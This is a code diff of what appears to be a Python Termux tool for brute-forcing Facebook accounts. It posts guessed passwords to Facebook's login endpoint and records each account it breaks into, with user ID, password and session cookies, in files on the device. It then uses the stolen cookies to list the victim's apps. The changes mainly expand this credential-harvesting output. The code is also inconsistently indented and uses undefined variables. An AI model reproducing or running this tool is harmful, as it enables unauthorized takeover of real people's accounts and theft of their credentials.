@@ -122,7 +122,7 @@ logo ="""
 
  \033[1;32m╔════════════════════════════════════════╗
  \033[1;32m║[•] AUTHOR :\031[1;32m ABU RAHIAN ANTO 
- \033[1;32m║[•] FACEBOOK GROUP:\031[1;32m TERMUX & SPAMMING ZONE
+ \033[1;32m║[•] FACEBOOK GROUP  :\031[1;32m TERMUX & SPAMMING ZONE [TSZ]   
  \033[1;32m║[•] WHATSAPP :\030[1;32m +8801972239643
  \033[1;32m║[•] GITHUB :\030[1;32m FOX-AR
  \033[1;32m║[•] STATUS :\030[1;32m PREMIUM
@@ -143,7 +143,7 @@ def sex():
   id = "|".join(uuid)
   print("\n\n\x1b[32;1m  YOUR KEY : \033[94m"+id) 
   try: 
-    httpCaht = requests.get("https://github.com/FOX-AR/Approval.txt/blob/main/Approval.txt").text 
+    httpCaht = requests.get("https://github.com/FOX-AR/Approval.txt").text 
     if id in httpCaht: 
       print("\033[92m  YOUR KEY IS ACTIVE AGAIN RUN THISH TOOLS˜˜........\033[97m")
       msg = str(os.geteuid()) 
@@ -165,19 +165,32 @@ def sex():
 
 
 
+#---------------------[APPLICATION CHECKER]---------------------#
 def cek_apk(session,coki):
     w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
     x = sop.find("form",method="post")
     game = [i.text for i in x.find_all("h3")]
     if len(game)==0:
-        print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
+        print(f'    %s{P}[%s×%s] %sSorry there is no Active  Apk%s         '%(N,M,N,B,N))
     else:
-        print(f'\r ðŸŽ®  %sYour Active Application Details :'%(H))
+        print(f'    [🎮] %s ☆ Your Active Apps ☆     :{B}'%(GREEN))
         for i in range(len(game)):
-            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
+            print(f"    [%s%s] {H}%s %s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
         #else:
             #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
+    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'    %s[%s!%s] %sSorry there is no Expired Apk%s                \n'%(N,B,N,M,N))
+    else:
+        print(f'    [✔] %s ☑ Your Expired Apps ☑    :{WHITE}'%(M))
+        for i in range(len(game)):
+            print(f"    [%s%s] %s %s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
+        else:
+            print("    %s═════════════════════%s═════════════════════%s"%(M,H,P))
 def main():
     user=[]
     os.system('clear')
@@ -278,22 +291,51 @@ def rcrack(uid,pwx,tl):
 			'sec-fetch-site': 'same-origin',
 			'upgrade-insecure-requests': '1',
 			'user-agent': pro,}
-			lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
-			log_cookies=session.cookies.get_dict().keys()
-			#print(iid+'|'+pws+'|'+str(log_cookies))
-			if 'c_user' in log_cookies:
-				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-				cid = coki[7:22]
-				print('\33[1;92m[TSZ-FIRE] '+cid+' | '+ps+'\33[0;97m')
-				cek_apk(session,coki)
-				open('tsz-ok.txt', 'a').write(cid+' | '+ps+'\n')
-				oks.append(cid)
-				break
-			else:
-				continue
-		loop+=1
-	except:
-		pass
-print('chk update')
-sex()
-main()
+			lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print('\r\033[1;91m══════════════════════════════════════════')
+                print('\r\033[1;91m[✓] STATUS		:TSZ_OK💜')
+                print('\r\033[1;91m[✓] USER ID		: '+cid+' ')
+                print('\r\033[1;91m[✓] USER PASSWORD 		: '+ps+' ')
+                print('\r\033[1;91m══════════════════════════════════════════')          
+                print('\r\033[1;91m[✓] USER COOKIES:'+coki+' ')
+                print('\r\033[1;91m══════════════════════════════════════════')
+                cek_apk(session,coki)
+                open('/sdcard/TSZ-OK.txt', 'a').write(cid+' | '+ps+'\n')
+                oks.append(cid + '|' + pw)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid=coki[24:39]
+                Red = '\033[1;31m'
+                print('\r\033[1;34m══════════════════════════════════════════')
+                print('\r\033[1;34m[✓] STATUS		: TSZ_CP🥀')
+                print('\r\033[1;34m[✓] USER ID		: ' +cid+ ' ')
+                print('\r\033[1;91m[✓] USER PASSWORD 		: ' +ps+ '')
+                print('\r\033[1;34m══════════════════════════════════════════')           
+                open('/sdcard/TSZ-CP.txt', 'a').write(cid+' | '+ps+'\n')
+                cps.append(cid + '|' + pw)
+                break
+            elif '/x/checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid=coki[7:22]
+                Red = '\033[1;34m'
+                print(f'\r{YELLOW}[TP-LOCK] '+idf+' | '+ps+'\033[1;97m')
+                open('/sdcard/2F-😩.txt', 'a').write(idf+' | '+ps+'\n')
+                twf.append(idf)
+            else:
+                continue
+        loop+=1
+        sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x))
+        sys.stdout.flush()
+        checks(oks,cps,twf)
+    except:
+        pass
+
+        
+ 
+if __name__ == '__main__':
+    Anto()
